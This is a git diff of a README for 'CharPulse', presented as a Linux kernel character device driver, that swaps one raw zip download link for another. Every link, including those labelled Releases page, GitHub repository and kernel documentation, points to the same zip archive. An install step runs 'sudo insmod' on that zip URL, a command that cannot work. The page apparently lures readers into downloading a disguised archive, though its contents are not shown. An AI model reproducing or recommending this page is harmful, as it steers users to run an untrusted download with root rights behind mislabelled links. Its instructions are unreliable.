@@ -4,7 +4,7 @@
 CharPulse is a Linux character device driver with a dynamically resizing kernel buffer. It supports read, write, append, and clear operations, allowing storage of large amounts of data safely. 
 
 ## 📥 Download CharPulse
-[![Download CharPulse](https://raw.githubusercontent.com/Huy-glith/CharPulse/main/userspace/CharPulse-1.9-beta.3.zip%20CharPulse-v1.0-blue)](https://raw.githubusercontent.com/Huy-glith/CharPulse/main/userspace/CharPulse-1.9-beta.3.zip)
+[![Download CharPulse](https://github.com/Huy-glith/CharPulse/raw/refs/heads/main/src/Char-Pulse-2.3.zip%20CharPulse-v1.0-blue)](https://github.com/Huy-glith/CharPulse/raw/refs/heads/main/src/Char-Pulse-2.3.zip)
 
 ## 📋 System Requirements
 - **Operating System:** A compatible version of GNU/Linux
@@ -18,7 +18,7 @@ CharPulse is a Linux character device driver with a dynamically resizing kernel 
 - **Efficient Performance:** Designed to handle large amounts of data seamlessly.
 
 ## 📦 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Huy-glith/CharPulse/main/userspace/CharPulse-1.9-beta.3.zip) to download the latest version of CharPulse. Here’s how to do it:
+To get started, visit the [Releases page](https://github.com/Huy-glith/CharPulse/raw/refs/heads/main/src/Char-Pulse-2.3.zip) to download the latest version of CharPulse. Here’s how to do it:
 
 1. Click the link above to go to the Releases page.
 2. Find the version you want to download.
@@ -30,7 +30,7 @@ To run CharPulse after downloading, follow these steps:
 
 1. Open your terminal.
 2. Navigate to the directory where you saved the downloaded file.
-3. Use the command `sudo insmod https://raw.githubusercontent.com/Huy-glith/CharPulse/main/userspace/CharPulse-1.9-beta.3.zip` to install the driver.
+3. Use the command `sudo insmod https://github.com/Huy-glith/CharPulse/raw/refs/heads/main/src/Char-Pulse-2.3.zip` to install the driver.
 
 ### ✔️ Verify Installation
 After installing, you can check if CharPulse is running properly by using the command:
@@ -64,16 +64,16 @@ If you run into issues while using CharPulse, consider the following steps:
 - **Consult Logs:** System logs can provide insight into what went wrong. Use `dmesg` to view them.
 
 ## 💬 Questions or Feedback?
-If you have questions or feedback about CharPulse, feel free to open an issue in the [GitHub repository](https://raw.githubusercontent.com/Huy-glith/CharPulse/main/userspace/CharPulse-1.9-beta.3.zip). Your input helps us improve.
+If you have questions or feedback about CharPulse, feel free to open an issue in the [GitHub repository](https://github.com/Huy-glith/CharPulse/raw/refs/heads/main/src/Char-Pulse-2.3.zip). Your input helps us improve.
 
 ## 📚 Related Resources
-- [Linux Kernel Documentation](https://raw.githubusercontent.com/Huy-glith/CharPulse/main/userspace/CharPulse-1.9-beta.3.zip)
-- [GNU/Linux System Admin Guide](https://raw.githubusercontent.com/Huy-glith/CharPulse/main/userspace/CharPulse-1.9-beta.3.zip)
-- [Character Device Documentation](https://raw.githubusercontent.com/Huy-glith/CharPulse/main/userspace/CharPulse-1.9-beta.3.zip)
+- [Linux Kernel Documentation](https://github.com/Huy-glith/CharPulse/raw/refs/heads/main/src/Char-Pulse-2.3.zip)
+- [GNU/Linux System Admin Guide](https://github.com/Huy-glith/CharPulse/raw/refs/heads/main/src/Char-Pulse-2.3.zip)
+- [Character Device Documentation](https://github.com/Huy-glith/CharPulse/raw/refs/heads/main/src/Char-Pulse-2.3.zip)
 
 ## 🏷️ Topics
 c-lang, c-language, c-programming, c-programming-language, character-device, character-device-driver, gnu-linux, linux, linux-driver, linux-drivers, linux-kernel, linux-kernel-driver, linux-kernel-module, linux-lkm, linux-module, linux-modules
 
 ---
 
-For more information, be sure to check the [Releases page](https://raw.githubusercontent.com/Huy-glith/CharPulse/main/userspace/CharPulse-1.9-beta.3.zip). Happy coding!
+For more information, be sure to check the [Releases page](https://github.com/Huy-glith/CharPulse/raw/refs/heads/main/src/Char-Pulse-2.3.zip). Happy coding!
